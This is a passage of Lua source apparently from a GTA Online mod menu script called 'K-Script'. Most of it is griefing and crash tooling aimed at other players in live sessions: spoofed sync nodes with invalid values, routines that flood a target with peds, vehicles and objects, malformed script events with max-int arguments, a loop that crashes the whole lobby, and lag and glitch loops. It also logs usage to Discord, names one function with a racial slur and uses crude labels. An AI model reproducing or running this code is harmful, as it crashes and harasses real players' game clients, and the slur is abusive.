  if nodeType == eSyncDataNode.CPlayerAppearanceDataNode and isPlayerFeatureEnabled("InvalidMComp5", playerId) then
    node.NewModelHash = Utils.Joaat("P_Michael_57")
    notify("Spoofing CPlayerAppearanceDataNode...")
    return
  end

  if nodeType == eSyncDataNode.CPedAppearanceDataNode and isPlayerFeatureEnabled("InvalidPhoneGesture7", playerId) then
    node.PhoneMode = -1
    notify("Spoofing CPedAppearanceDataNode...")
  end
end

local function safeRegisterLoopedOnce(name, callback)
  local flag = "__kscript_loop_" .. name
  if _ENV[flag] then
    return
  end

  Script.RegisterLooped(callback)
  _ENV[flag] = true
end

local function finalizeStartup()
  if kscriptStartupFinalized then
    return
  end

  Logger.Log(eLogColor.GREEN, "K-Script", "Initializing Features...")
  if isGameVersionEnhanced then
    pcall(FeatureMgr.RemoveFeatureArray, Utils.Joaat("standcrash"), 31)
  end

  Logger.Log(eLogColor.GREEN, "K-Script", "Loading Settings...")
  Script.QueueJob(loadDefaultConfig)

  Logger.Log(eLogColor.GREEN, "K-Script", ("Started Successfully! (took %.3f ms)"):format((os.clock() - startClock) * 1000))
  initiateIntro()
  kscriptStartupFinalized = true
end

if not kscriptFinalHandlersRegistered then
  pcall(EventMgr.RegisterHandler, eLuaEvent.ON_POST_PRESENT, updateFeatureTransitionPostPresent)
  pcall(EventMgr.RegisterHandler, eLuaEvent.SHOULD_TRIGGER_EXCLUSIVE_SYNC, shouldTriggerExclusiveSync)
  pcall(EventMgr.RegisterHandler, eLuaEvent.ON_SYNC_DATA_NODE, onSyncDataNode)
  pcall(EventMgr.RegisterHandler, eLuaEvent.SHOULD_COLLIDE, ShouldCollideHandler)

  safeRegisterLoopedOnce("processAdvancedDrawing", processAdvancedDrawing)
  safeRegisterLoopedOnce("getControl", getControl)
  safeRegisterLoopedOnce("processPurificationMain", processPurificationMain)

  kscriptFinalHandlersRegistered = true
end

finalizeStartup()

function featureHash(id)
  return type(id) == "number" and id or Utils.Joaat(tostring(id))
end

function isRegisteredFeature(id, playerScoped)
  local hash = featureHash(id)
  if registeredFeatures.hashAndName[hash] ~= nil then
    return true
  end

  local ok, feature
  if playerScoped then
    ok, feature = pcall(FeatureMgr.GetFeature, hash, 0)
  else
    ok, feature = pcall(FeatureMgr.GetFeature, hash)
  end

  return ok and feature ~= nil
end

function ensureButtonFeature(id, label, description, callback, clickAfterAdd)
  if isRegisteredFeature(id, false) then
    return FeatureMgr.GetFeature(featureHash(id))
  end

  return FeatAdd(featureHash(id), label, eFeatureType.Button, description or "", callback or function()
  end, clickAfterAdd == true)
end

function ensureInputTextPlayerFeature(id, label, description, callback)
  if isRegisteredFeature(id, true) then
    return nil
  end

  return PlayerFeatAdd(featureHash(id), label, eFeatureType.InputText, description or "", callback or function()
  end)
end

function ensureButtonPlayerFeature(id, label, description, callback, clickAfterAdd)
  if isRegisteredFeature(id, true) then
    return nil
  end

  return PlayerFeatAdd(featureHash(id), label, eFeatureType.Button, description or "", callback or function()
  end, clickAfterAdd == true)
end

function ensureTogglePlayerFeature(id, label, description, callback, clickAfterAdd)
  if isRegisteredFeature(id, true) then
    return nil
  end

  return PlayerFeatAdd(featureHash(id), label, eFeatureType.Toggle, description or "", callback or function()
  end, clickAfterAdd == true)
end

function selectedPlayerIdFromFeature(feature)
  if feature and feature.GetPlayerIndex then
    local ok, playerId = pcall(feature.GetPlayerIndex, feature)
    if ok and playerId ~= nil then
      return playerId
    end
  end

  if Utils.GetSelectedPlayer then
    local ok, playerId = pcall(Utils.GetSelectedPlayer)
    if ok then
      return playerId
    end
  end

  return nil
end

function targetIsProtected(playerId)
  local player = Players.GetById(playerId)
  if not player then
    return true, "Invalid player."
  end

  local gamerInfo = player:GetGamerInfo()
  if gamerInfo and blacklistRIDList[gamerInfo.RockstarId] and not isDev then
    blacklistSound()
    SendToDiscord("protection", ("%s(%i) tried to use a K-Script action on protected player %s."):format(
      Players.GetName(GTA.GetLocalPlayerId()) or "Unknown",
      Cherax.GetUID(),
      Players.GetName(playerId) or tostring(playerId)
    ))
    return true, "Cannot target this player."
  end

  if detectedPlayerReasons[playerId + 1] == "K-Script User" and not isDev then
    blacklistSound()
    SendToDiscord("protection", ("%s(%i) tried to target another K-Script user %s."):format(
      Players.GetName(GTA.GetLocalPlayerId()) or "Unknown",
      Cherax.GetUID(),
      Players.GetName(playerId) or tostring(playerId)
    ))
    return true, "Cannot target this player."
  end

  return false, nil
end

function resolveActionTarget(feature, actionName, requirePrivileged)
  local playerId = selectedPlayerIdFromFeature(feature)
  if playerId == nil or playerId == GTA.GetLocalPlayerId() then
    notify(("No valid target for %s."):format(actionName or "action"))
    return nil
  end

  if requirePrivileged and not (isDev or isAdmin or isSupporter) then
    notify("This feature is for supporters.")
    return nil
  end

  local protected, reason = targetIsProtected(playerId)
  if protected then
    notify(reason or "Target is protected.")
    return nil
  end

  return playerId, Players.GetById(playerId)
end

function logPlayerAction(actionName, playerId)
  local targetName = Players.GetName(playerId) or tostring(playerId)
  SendToDiscord("action", ("%s used %s against %s with UID %i, isSupporter: %s"):format(
    PLAYER.GET_PLAYER_NAME(GTA.GetLocalPlayerId()) or "Unknown",
    actionName,
    targetName,
    Cherax.GetUID(),
    tostring(isSupporter)
  ))
end

function beginActionCooldown(actionName)
  if oncrashCooldown and not isDev then
    notify("Another action is running, please wait for it to finish.")
    return false
  end

  oncrashCooldown = true
  if actionName then
    notify(actionName .. " running...")
  end
  return true
end

function endActionCooldown(actionName)
  oncrashCooldown = false
  if actionName then
    notify(actionName .. " complete.")
  end
end

function playerPedHandle(playerId)
  local ok, ped = pcall(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX, playerId)
  if ok and ped and ped ~= 0 then
    return ped
  end
  return nil
end

function targetPosition(playerId)
  local ped = playerPedHandle(playerId)
  if not ped then
    return nil
  end

  local ok, x, y, z = pcall(ENTITY.GET_ENTITY_COORDS, ped, true)
  if ok then
    return V3.New(x, y, z)
  end

  return nil
end

function deleteEntityList(entities, delay)
  for _, entity in ipairs(entities or {}) do
    DeleteEnt(entity)
    if delay then
      Script.Yield(delay)
    end
  end
end

function spawnPedBurstAtPlayer(playerId, modelNames, count, delay)
  local position = targetPosition(playerId)
  if not position then
    notify("Target is too far away or invalid.")
    return {}
  end

  local targetPed = playerPedHandle(playerId)
  local heading = targetPed and ENTITY.GET_ENTITY_HEADING(targetPed) or 0
  local spawned = {}

  for index = 1, count do
    local modelName = modelNames[((index - 1) % #modelNames) + 1]
    local model = type(modelName) == "number" and modelName or Utils.Joaat(modelName)
    request_model(model)
    local ped = GTA.CreatePed(model, 28, position.x, position.y, position.z, heading)
    if ped and ped ~= 0 then
      spawned[#spawned + 1] = ped
    end
    Script.Yield(delay or 25)
  end

  return spawned
end

function spawnVehicleNearPlayer(playerId, modelName, zOffset, heading)
  local position = targetPosition(playerId)
  if not position then
    return nil
  end

  local model = type(modelName) == "number" and modelName or Utils.Joaat(modelName)
  request_model(model)
  local vehicle = GTA.SpawnVehicle(model, position.x, position.y, position.z + (zOffset or 0), heading or 0, true, true)
  if vehicle and vehicle ~= 0 then
    setEntProofs(vehicle)
  end
  return vehicle
end

function spawnObjectNearPlayer(playerId, modelName, zOffset)
  local position = targetPosition(playerId)
  if not position then
    return nil
  end

  local model = type(modelName) == "number" and modelName or Utils.Joaat(modelName)
  request_model(model)
  local object = GTA.CreateObject(model, position.x, position.y, position.z + (zOffset or 0), true, true)
  if object and object ~= 0 then
    pcall(OBJECT.SET_ACTIVATE_OBJECT_PHYSICS_AS_SOON_AS_IT_IS_UNFROZEN, object, true)
    pcall(PHYSICS.ACTIVATE_PHYSICS, object)
  end
  return object
end

function playerZerocrash(playerId)
  playerId = playerId or Utils.GetSelectedPlayer()
  if playerId == nil then
    return
  end

  if not beginActionCooldown("Overload action") then
    return
  end

  local spawned = spawnPedBurstAtPlayer(playerId, {"PLAYER_ZERO", "PLAYER_ONE", "PLAYER_TWO", "P_Michael_79"}, 32, 20)
  Script.Yield(750)
  deleteEntityList(spawned, 5)
  endActionCooldown("Overload action")
end

function niggercrash(playerId)
  playerId = playerId or Utils.GetSelectedPlayer()
  if playerId == nil then
    return
  end

  if not beginActionCooldown("Ped burst action") then
    return
  end

  local spawned = spawnPedBurstAtPlayer(playerId, {"PLAYER_TWO", "P_Michael_46", "P_Michael_13", "P_Michael_24"}, 48, 15)
  for _, entity in ipairs(spawned) do
    pcall(GTA.GiveControl, playerId, entity)
  end

  Script.Yield(1000)
  deleteEntityList(spawned, 5)
  endActionCooldown("Ped burst action")
end

ensureButtonFeature("clearCache", "Clear Script Cache", "", function()
  if isDev then
    Logger.Log(eLogColor.YELLOW, "K-Script", "clearing Cache...")
  end

  clearingCache = true
  detectedPlayerNames = {}
  detectedPlayerReasons = {}
  sentKScriptEventPlayers = {}
  sentHostShareEventPlayers = {}
  voiceChatters = {}
  clearingCache = false
  collectgarbage("collect")

  if isDev then
    Logger.Log(eLogColor.YELLOW, "K-Script", "cleared Cache")
  end
end)

ensureButtonFeature("fixcam", "Unstuck Cam", "Fixes your Cam after it got Stuck when running a crash", function()
  CAM.RENDER_SCRIPT_CAMS(false, false, 0, false, false, false)
  if activeScriptCam then
    pcall(CAM.SET_CAM_ACTIVE, activeScriptCam, false)
  end
  STREAMING.CLEAR_FOCUS()
  CAM.DESTROY_ALL_CAMS(false)
end)

function triggerFeatureByName(name, playerId)
  if FeatureMgr.GetFeatureByName == nil then
    return false
  end

  local ok, feature = pcall(FeatureMgr.GetFeatureByName, name, playerId)
  if ok and feature then
    if feature.TriggerCallback then
      pcall(feature.TriggerCallback, feature)
    elseif feature.OnClick then
      pcall(feature.OnClick, feature)
    elseif feature.Toggle then
      pcall(feature.Toggle, feature)
    end
    return true
  end

  return false
end

ensureButtonFeature("rejoin", "Re-Join Session", "Re-join the current session.", function()
  Script.QueueJob(function()
    local host = NETWORK.NETWORK_GET_HOST_PLAYER_INDEX()
    local player = Players.GetById(host)
    local gamerInfo = player and player:GetGamerInfo()

    if not gamerInfo then
      notify("Session re-join failed, could not get host gamer info.")
      return
    end

    triggerFeatureByName("Notify On Player Join")
    triggerFeatureByName("Notify On Player Leave")
    Script.Yield(500)
    triggerFeatureByName("Story Bail From Session")

    local deadline = Time.GetEpocheMs() + 15000
    while numConnectedPlayers > 0 and Time.GetEpocheMs() < deadline and not ShouldUnload() do
      Script.Yield(1000)
    end

    local joinRidFeature = FeatureMgr.GetFeatureByName and FeatureMgr.GetFeatureByName("Join Rockstar Id") or nil
    local ridInputHash = Utils.Joaat("SCAPIRID")
    pcall(FeatureMgr.SetFeatureInt, ridInputHash, gamerInfo.RockstarId)
    if joinRidFeature and joinRidFeature.TriggerCallback then
      joinRidFeature:TriggerCallback()
    else
      triggerFeatureByName("Start Session")
    end
    pcall(FeatureMgr.SetFeatureInt, ridInputHash, 12345)
  end)
end)

ensureToggleFeature("skipreload", "Instant Reload", "Disables the Reload Animation", false)

ensureToggleFeature("crashAllk", "Lobby Action", "Runs the configured per-player lobby action.", false, function(feature)
  if not feature:IsToggled() then
    return
  end

  Script.QueueJob(function()
    for playerId = 0, 31 do
      if not isFeatureEnabled("crashAllk") or ShouldUnload() then
        return
      end

      if playerId ~= GTA.GetLocalPlayerId() and Players.GetById(playerId) then
        Logger.Log(eLogColor.GREEN, "K-Script", ("Sending lobby action to: %s"):format(Players.GetName(playerId) or tostring(playerId)))
        triggerFeatureByName("Auxiliary Cannon crash", playerId)
        Script.Yield(50)
      end
    end

    local toggle = safeFeature("crashAllk")
    if toggle and toggle.Toggle then
      toggle:Toggle()
    end
    notify("Lobby action complete.")
  end)
end)

ensureButtonFeature("sigTest", "Lobby Stress Test", "", function()
  if not isDev then
    notify("This feature is currently disabled.")
    return
  end

  Script.QueueJob(function()
    local ped = getPlayerPed()
    local position = V3.New(ENTITY.GET_ENTITY_COORDS(ped, false))
    local spawned = {}
    request_model(941494461)

    for _ = 1, 12 do
      spawned[#spawned + 1] = GTA.CreateRandomPed(position.x, position.y, position.z)
      spawned[#spawned + 1] = GTA.SpawnVehicle(941494461, position.x, position.y, position.z, 0, true)
      spawned[#spawned + 1] = GTA.CreateObject(18704222, position.x, position.y, position.z, false)
      Script.Yield(100)
    end

    Script.Yield(2500)
    deleteEntityList(spawned, 10)
    notify("Lobby stress test complete.")
  end)
end)

ensureButtonFeature("InvalidPhoneGesturev54", "Phone Gesture Test", "", function()
  Script.QueueJob(function()
    if not beginActionCooldown("Phone gesture test") then
      return
    end

    local ped = getPlayerPed()
    local weapons = {Utils.Joaat("WEAPON_ASSAULTSHOTGUN"), Utils.Joaat("WEAPON_PUMPSHOTGUN")}
    local deadline = Time.GetEpocheMs() + 1500
    while Time.GetEpocheMs() < deadline and not ShouldUnload() do
      MOBILE.CREATE_MOBILE_PHONE(1)
      MOBILE.CELL_CAM_ACTIVATE(true, true)
      WEAPON.GIVE_WEAPON_TO_PED(ped, weapons[math.random(#weapons)], 9999, true, true)
      MOBILE.DESTROY_MOBILE_PHONE()
      Script.Yield(75)
    end

    endActionCooldown("Phone gesture test")
  end)
end)

ensureButtonFeature("lobbycorrupt", "Send Lobby into Respawn Loop", "makes them get stuck in a die/respawn loop", function()
  if not (isDev or isAdmin) then
    notify("This feature is currently disabled.")
    return
  end

  for playerId = 0, 31 do
    if playerId ~= GTA.GetLocalPlayerId() and Players.GetById(playerId) then
      triggerFeatureByName("Kill Player", playerId)
      Script.Yield(50)
    end
  end
end)

ensureButtonPlayerFeature("remotehostkick", "Shared Host Kick", "Remotely Host Kicks People if another K-Script User is the Session Host.", function(feature)
  local playerId = resolveActionTarget(feature, "Shared Host Kick", false)
  if not playerId then
    return
  end

  if hostSharePID == nil then
    notify("Remote Host Kick Failed!")
    return
  end

  local target = Players.GetById(playerId)
  local gamerInfo = target and target:GetGamerInfo()
  if not gamerInfo then
    notify("Remote Host Kick Failed!")
    return
  end

  GTA.TriggerScriptEvent(1 << hostSharePID, SCRIPT_EVENT.SCRIPT_EVENT_OHD_IS_PLAYER_PAUSING_RESET, GTA.GetLocalPlayerId(), 1 << hostSharePID, 0, gamerInfo.RockstarId)
end, true)

ensureButtonPlayerFeature("remoteunload", "Remotely Unload K-Script!", "Remotely unloads K-Script from a K-Script User!", function(feature)
  local playerId = resolveActionTarget(feature, "Remotely Unload K-Script!", true)
  if not playerId then
    return
  end

  local rid = tonumber(getLocalRockstarId()) or 0
  GTA.TriggerScriptEvent(1 << playerId, SCRIPT_EVENT.SCRIPT_EVENT_OHD_IS_PLAYER_PAUSING_RESET, GTA.GetLocalPlayerId(), 1 << playerId, 0, rid + 1978 + rid)
  notify(("Sent remote unload to %s"):format(Players.GetName(playerId) or tostring(playerId)))
end, true)

ensureButtonPlayerFeature("remotecrash", "Remotely crash K-Script!", "Remotely crashes a K-Script User!", function(feature)
  local playerId = resolveActionTarget(feature, "Remotely crash K-Script!", true)
  if not playerId then
    return
  end

  local rid = tonumber(getLocalRockstarId()) or 0
  GTA.TriggerScriptEvent(1 << playerId, SCRIPT_EVENT.SCRIPT_EVENT_OHD_IS_PLAYER_PAUSING_RESET, GTA.GetLocalPlayerId(), 1 << playerId, 0, rid + 1979 + rid)
  notify(("Sent remote action to %s"):format(Players.GetName(playerId) or tostring(playerId)))
end, true)

windmillModelHash = 1952396163
spawnState = spawnState or {
  spawnDowntown = false,
  spawnHarmony = false,
  spawnLaMesa = false,
  LSCburton = false,
  LSCburton2 = false,
  BeekersGarage = false,
  LSCM = false,
  EclipseTowers = false,
  casino = false,
  bennysgarage = false,
  mazebankgarage = false,
  spawn50cargarage = false,
}

spawnLocations = spawnLocations or {
  {name = "LSC Downtown", key = "spawnDowntown", x = -362.242, y = -100.646, z = 39.13},
  {name = "LSC Harmony (Desert)", key = "spawnHarmony", x = 1178.464, y = 2686.479, z = 38.789},
  {name = "LSC La Mesa (Near Airport)", key = "spawnLaMesa", x = -1127.856, y = -1947.417, z = 15.162},
  {name = "LSC Burton (Midtown)", key = "LSCburton", x = 710.009, y = -1047.14, z = 23.767},
  {name = "LSC Burton #2", key = "LSCburton2", x = -395.716, y = -118.709, z = 39.534},
  {name = "Beekers Garage", key = "BeekersGarage", x = 117.413, y = 6649.705, z = 32.789},
  {name = "LSCM", key = "LSCM", x = 785.702, y = -1831.641, z = 31.216},
  {name = "Eclipse Towers Apartment", key = "EclipseTowers", x = -796.469, y = 340.324, z = 86.3},
  {name = "Casino", key = "casino", x = 921.877, y = 80.657, z = 82.566},
  {name = "Benny's Garage", key = "bennysgarage", x = -204.025, y = -1265.435, z = 32.644},
  {name = "Maze Bank Garage", key = "mazebankgarage", x = -90.14, y = -720.435, z = 44.644},
  {name = "Large Garage", key = "spawn50cargarage", x = -269.24, y = 320.479, z = 89.256},
}

function spawnWindmillAtPosition(position, rotation)
  request_model(windmillModelHash)
  local object = GTA.CreateObject(windmillModelHash, position.x, position.y, position.z, true, true)
  if object and object ~= 0 then
    yeetwindmills[#yeetwindmills + 1] = object
    ENTITY.SET_ENTITY_LOD_DIST(object, 100000)
    request_control(object)
    ENTITY.SET_ENTITY_ROTATION(object, rotation or 180, 0, 0, 2, true)
  end
  return object
end

function spawnSelectedWindmills()
  local spawned = 0
  for _, location in ipairs(spawnLocations) do
    if spawnState[location.key] then
      spawnWindmillAtPosition(location, 90)
      spawned = spawned + 1
      Script.Yield(25)
    end
  end

  notify(("Spawned %d windmill objects."):format(spawned))
end

function registerWindmillFeatures()
  if kscriptWindmillFeaturesRegistered then
    return
  end

  local spawnLocationFeature = FeatAdd(Utils.Joaat("ToggleSpawnLocations"), "Toggle Spawn Locations", eFeatureType.ComboToggles, "Toggle spawning at various locations.", function(feature)
    for index, location in ipairs(spawnLocations) do
      local enabled = feature.IsListIndexToggled and feature:IsListIndexToggled(index - 1) or false
      spawnState[location.key] = enabled == true
    end
  end, true)

  local labels = {}
  for _, location in ipairs(spawnLocations) do
    labels[#labels + 1] = location.name
  end
  callFeature(spawnLocationFeature, "SetList", labels)

  ensureButtonFeature("SPAWN_OBJECT_AT_LSC", "Spawn Windmills", "Spawns objects at selected locations in the combo above`. Can only be used once per Session.", function()
    if not (isDev or isAdmin or isSupporter) then
      notify("This feature is for supporters.")
      return
    end
    Script.QueueJob(spawnSelectedWindmills)
  end, true)

  ensureButtonFeature("SpawnWindmillAtPlayerFeet", "Spawn Windmill on you", "Spawns a windmill at your feet", function()
    if not (isDev or isAdmin or isSupporter) then
      notify("This feature is for supporters.")
      return
    end

    local ped = getPlayerPed()
    local x, y, z = ENTITY.GET_ENTITY_COORDS(ped, true)
    spawnWindmillAtPosition(V3.New(x + 1, y + 38, z - 2), 180)
  end)

  ensureButtonPlayerFeature("SpawnWindmillAtRemotePlayerFeet", "Spawn Windmill on them", "Spawns a Windmill at their feet.\nMay need to spectate them if they are far away.", function(feature)
    local playerId = resolveActionTarget(feature, "Spawn Windmill", true)
    if not playerId then
      return
    end

    local position = targetPosition(playerId)
    if position then
      spawnWindmillAtPosition(V3.New(position.x + 1, position.y + 38, position.z - 2.5), 180)
    end
  end)

  ensureButtonFeature("DeleteAllSpawnedWindmills", "Delete all windmills", "", function()
    deleteEntityList(yeetwindmills, 1)
    yeetwindmills = {}
  end)

  kscriptWindmillFeaturesRegistered = true
end

registerWindmillFeatures()

largeObjectDumpEntities = largeObjectDumpEntities or {}
largeObjectDumpByPlayer = largeObjectDumpByPlayer or {}

largeObjectModels = {
  "ar_prop_ar_neon_gate0x_25a",
  "ar_prop_ar_neon_gate1x_37a",
  "ar_prop_ar_neon_gate3x_50a",
}

function runLargeObjectDump(playerId, count)
  local position = targetPosition(playerId)
  if not position then
    notify("Target is too far away or invalid.")
    return
  end

  for _, modelName in ipairs(largeObjectModels) do
    request_model(Utils.Joaat(modelName))
  end

  for _ = 1, count do
    local object = spawnObjectNearPlayer(playerId, largeObjectModels[math.random(#largeObjectModels)], math.random(25, 45))
    if object and object ~= 0 then
      largeObjectDumpEntities[#largeObjectDumpEntities + 1] = object
    end
    Script.Yield(15)
  end

  largeObjectDumpByPlayer[playerId] = true
end

function cleanupLargeObjectDump()
  deleteEntityList(largeObjectDumpEntities, 10)
  largeObjectDumpEntities = {}
  largeObjectDumpByPlayer = {}
end

function registerObjectActionFeatures()
  if kscriptObjectActionFeaturesRegistered then
    return
  end

  for _, id in ipairs({"largeObjDmp0", "largeObjDmp1", "largeObjDmp3", "largeObjDmp4"}) do
    ensureButtonPlayerFeature(id, "Large Object Dump", "dumps large laggy objects on the player", function(feature)
      local playerId = resolveActionTarget(feature, "Large Object Dump", true)
      if playerId then
        Script.QueueJob(runLargeObjectDump, playerId, 20)
      end
    end)
  end

  for _, id in ipairs({"largeObjDmpCleanup5", "largeObjDmpCleanup7", "largeObjDmpCleanup8", "largeObjDmpCleanup9"}) do
    ensureButtonFeature(id, "Delete Large Objects", "", function()
      cleanupLargeObjectDump()
    end)
  end

  local function vehicleGlitchLoop(feature, modelName, zOffset, cleanupDelay)
    local playerId = resolveActionTarget(feature, modelName .. " loop", true)
    if not playerId then
      if feature.SetValue then feature:SetValue(false) end
      return
    end

    local model = Utils.Joaat(modelName)
    request_model(model)
    local spawned = {}

    while feature:IsToggled() and not ShouldUnload() do
      local vehicle = spawnVehicleNearPlayer(playerId, model, zOffset or 0, math.random(0, 360))
      if vehicle then
        spawned[#spawned + 1] = vehicle
      end

      Script.Yield(cleanupDelay or 250)
      deleteEntityList(spawned)
      spawned = {}
      Script.Yield(15)
    end
  end

  for _, id in ipairs({"glitchP2", "glitchP5"}) do
    ensureTogglePlayerFeature(id, "Yeet from Existence", "Glitches the player.\nCan fling players outside of the map especially if they are in a vehicle.\nSpectate if you have issues with it.\nCan cause alot of stutters.", function(feature)
      if feature:IsToggled() then
        Script.QueueJob(vehicleGlitchLoop, feature, "proptrailer", 0, 125)
      end
    end, true)
  end

  for _, id in ipairs({"cargoglitch0", "cargoglitch2", "cargoglitch8"}) do
    ensureTogglePlayerFeature(id, "Glitch Player", "simple yet effective", function(feature)
      if feature:IsToggled() then
        Script.QueueJob(vehicleGlitchLoop, feature, "cargoplane", 0, 500)
      end
    end)
  end

  for _, id in ipairs({"pyroTroll3", "pyroTroll5", "pyroTroll8"}) do
    ensureTogglePlayerFeature(id, "Pyro Troll", "", function(feature)
      if not feature:IsToggled() then
        return
      end

      Script.QueueJob(function()
        local playerId = resolveActionTarget(feature, "Pyro Troll", true)
        if not playerId then
          feature:SetValue(false)
          return
        end

        local vehicle = spawnVehicleNearPlayer(playerId, "pyro", 125, -90)
        if vehicle then
          ENTITY.FREEZE_ENTITY_POSITION(vehicle, true)
          VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, false)
        end

        while feature:IsToggled() and not ShouldUnload() and vehicle and ENTITY.DOES_ENTITY_EXIST(vehicle) do
          local position = targetPosition(playerId)
          if position then
            request_control(vehicle)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehicle, position.x + 3, position.y, position.z, false, false, false)
          end
          Script.Yield(50)
        end

        DeleteEnt(vehicle)
      end)
    end)
  end

  for _, id in ipairs({"flipper3", "flipper5"}) do
    ensureTogglePlayerFeature(id, "Flipper Thingy", "Launches/Glitches/Freezes the player.", function(feature)
      if feature:IsToggled() then
        Script.QueueJob(function()
          local playerId = resolveActionTarget(feature, "Flipper Thingy", true)
          if not playerId then
            feature:SetValue(false)
            return
          end

          local model = Utils.Joaat("xs_prop_arena_flipper_xl_23a")
          request_model(model)
          local spawned = {}

          while feature:IsToggled() and not ShouldUnload() do
            local object = spawnObjectNearPlayer(playerId, model, -13.5)
            if object then
              spawned[#spawned + 1] = object
            end
            if #spawned > 8 then
              DeleteEnt(table.remove(spawned, 1))
            end
            Script.Yield(200)
          end

          deleteEntityList(spawned)
        end)
      end
    end)
  end

  ensureTogglePlayerFeature("tugLagger", "Lag em hoes!", "", function(feature)
    if feature:IsToggled() then
      Script.QueueJob(function()
        local playerId = resolveActionTarget(feature, "Lag em hoes!", true)
        if not playerId then
          feature:SetValue(false)
          return
        end

        local localPed = getPlayerPed()
        ENTITY.FREEZE_ENTITY_POSITION(localPed, true)
        while feature:IsToggled() and not ShouldUnload() do
          local position = targetPosition(playerId)
          local spawned = {}
          if position then
            ENTITY.SET_ENTITY_COORDS(localPed, position.x, position.y, position.z + 200)
            for _ = 1, 10 do
              local tug = spawnVehicleNearPlayer(playerId, "tug", 350, 1)
              if tug then
                spawned[#spawned + 1] = tug
              end
              Script.Yield()
            end
          end
          Script.Yield(600)
          deleteEntityList(spawned)
        end
        ENTITY.FREEZE_ENTITY_POSITION(localPed, false)
      end)
    end
  end)

  kscriptObjectActionFeaturesRegistered = true
end

registerObjectActionFeatures()

spoofedVehicle = spoofedVehicle or {}
spoofedPid = spoofedPid or {}
spoofedPed = spoofedPed or 0
randomCars = randomCars or {
  "zentorno", "t86", "krieger", "furia", "osiris", "nero", "reaper", "lm87", "gt750",
  "corsita", "tenf", "omnisegt", "vigero8", "torero3", "s24", "sentinel3", "rapidgt1",
  "l02", "tampa3", "fmj4",
}

function setPlayerToggleOff(id, playerId)
  local feature = FeatureMgr.GetFeature(featureHash(id), playerId)
  if feature and feature.SetValue then
    feature:SetValue(false)
    if feature.OnClick then
      feature:OnClick()
    end
  end
end

function registerPedActionFeature(id, label, runner, privileged, description)
  ensureButtonPlayerFeature(id, label, description or "", function(feature)
    local playerId = resolveActionTarget(feature, label, privileged)
    if not playerId then
      return
    end

    logPlayerAction(label, playerId)
    Script.QueueJob(runner, playerId)
  end, true)
end

function runElManuelcrash(playerId)
  if not beginActionCooldown("El Manuel crash") then return end
  notify("EL MANUEL crashES BRAZIL!")

  local position = targetPosition(playerId)
  if not position then
    endActionCooldown("El Manuel crash")
    return
  end

  local spawned = spawnPedBurstAtPlayer(playerId, {"cs_manuel"}, 6, 250)
  for _, ped in ipairs(spawned) do
    WEAPON.GIVE_WEAPON_TO_PED(ped, 1672152130, 1337, true, true)
    local weaponEntity = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX and WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped) or nil
    if weaponEntity and weaponEntity ~= 0 then
      ENTITY.DETACH_ENTITY(weaponEntity, true, true)
    end
    PED.SET_PED_SHOOTS_AT_COORD(ped, position.x, position.y, position.z - 40.0, true)
    Script.Yield(500)
  end

  notify("El Manuel crash complete!")
  endActionCooldown("El Manuel crash")
end

function runGen4crash(playerId)
  if not beginActionCooldown("Gen4 crash") then return end

  local position = targetPosition(playerId)
  if not position then
    endActionCooldown("Gen4 crash")
    return
  end

  for _ = 1, 6 do
    local ped = GTA.CreateRandomPed(position.x, position.y, position.z)
    if ped and ped ~= 0 then
      WEAPON.GIVE_WEAPON_TO_PED(ped, 2378080583, 1337, true, true)
      PED.SET_PED_SHOOTS_AT_COORD(ped, position.x, position.y, position.z - 40.0, true)
      Script.Yield(250)
      TASK.TASK_RELOAD_WEAPON(ped, true)
      Script.Yield(800)
      DeleteEnt(ped)
    end
  end

  notify("Gen2 crash complete!")
  endActionCooldown("Gen4 crash")
end

function runYeetEmcrash(playerId)
  if not beginActionCooldown("Yeet Em") then return end

  GTA.GiveScriptHost(playerId, Utils.Joaat("freemode"))
  Script.Yield(500)
  GTA.TriggerScriptEvent(1 << playerId, 323285304, GTA.GetLocalPlayerId(), 1 << playerId, 2147483647, 2147483647, 2147483647, 2147483647, 956849991, 0)
  notify("Done!")
  endActionCooldown("Yeet Em")
end

function toggleOutgoingBlocksExcept(targetPlayerId)
  for otherId = 0, 31 do
    if otherId ~= targetPlayerId and otherId ~= GTA.GetLocalPlayerId() and Players.GetById(otherId) then
      triggerFeatureByName("Block Out Syncs", otherId)
      triggerFeatureByName("Block Out SE", otherId)
    end
  end
end

function runBigBraincrash(playerId, actionName)
  if not isDev then
    notify("This crash is currently disabled!")
    return
  end

  if not beginActionCooldown(actionName) then return end

  toggleOutgoingBlocksExcept(playerId)
  triggerFeatureByName("Teleport To Player", playerId)
  Script.Yield(1500)

  local position = targetPosition(playerId)
  if not position then
    endActionCooldown(actionName)
    return
  end

  notify(actionName .. " in Progress...")
  local spawned = {}
  for _ = 1, 13 do
    spawned[#spawned + 1] = GTA.CreateRandomPed(position.x, position.y, position.z)
    spawned[#spawned + 1] = GTA.CreateObject(18704222, position.x, position.y, position.z, false)
    spawned[#spawned + 1] = GTA.CreateObject(303280717, position.x, position.y, position.z, false)
    spawned[#spawned + 1] = GTA.SpawnVehicle(3319621991, position.x, position.y, position.z, 0, true)
    spawned[#spawned + 1] = GTA.SpawnVehicle(1483319544, position.x, position.y, position.z, 0, true)
    spawned[#spawned + 1] = GTA.SpawnVehicle(1033245328, position.x, position.y, position.z, 0, true)
    triggerFeatureByName("Clear Wanted", playerId)
    Script.Yield(50)
  end

  notify(actionName .. " Step 3 Finished!")
  Script.Yield(5000)
  for _ = 1, 5 do
    triggerFeatureByName("Clear Area")
    Script.Yield(500)
  end
  deleteEntityList(spawned, 5)
  notify(actionName .. " Complete!")

  toggleOutgoingBlocksExcept(playerId)
  endActionCooldown(actionName)
end

function runGeniuscrash(playerId)
  if not beginActionCooldown("Genius crash") then return end
  notify("Genius crash running...")

  local targetPed = playerPedHandle(playerId)
  local localPed = getPlayerPed()
  local targetPosition = targetPosition(playerId)
  if not targetPed or not targetPosition then
    endActionCooldown("Genius crash")
    return
  end

  local original = V3.New(ENTITY.GET_ENTITY_COORDS(localPed, false))
  local vehicleModel = Utils.Joaat("envisage")
  request_model(vehicleModel)
  ENTITY.SET_ENTITY_COORDS_NO_OFFSET(localPed, targetPosition.x, targetPosition.y, targetPosition.z + 185.0, false, false, false)
  ENTITY.FREEZE_ENTITY_POSITION(localPed, true)
  Script.Yield(200)

  local spawned = {}
